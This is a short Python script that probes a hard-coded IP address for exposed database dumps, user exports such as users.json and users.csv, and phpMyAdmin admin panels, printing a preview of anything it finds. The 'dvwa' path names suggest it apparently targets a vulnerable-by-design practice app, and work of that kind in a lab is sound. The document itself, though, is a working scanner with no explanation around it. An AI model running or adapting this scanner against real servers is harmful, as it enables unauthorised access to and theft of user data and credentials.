
import requests

base_url = "http://31.97.117.123"

# Look for database dumps or exports
possible_paths = [
    "/dvwa.sql",
    "/database.sql",
    "/backup.sql",
    "/dump.sql",
    "/users.sql",
    "/db.sql",
    "/data/dvwa.sql",
    "/backups/dvwa.sql",
    "/exports/users.json",
    "/data/users.json",
    "/users.csv",
    "/data.csv",
    "/export.php",
    "/phpMyAdmin/",
    "/phpmyadmin/",
    "/mysqladmin/",
    "/pma/",
]

print("[*] Searching for database dumps and exports...\n")

for path in possible_paths:
    url = base_url + path
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200 and len(response.text) > 0:
            print(f"\n[+] Found: {path}")
            print(f"Status: {response.status_code}")
            print(f"Content preview: {response.text[:300]}")
    except:
        pass

print("\n[*] Done searching")

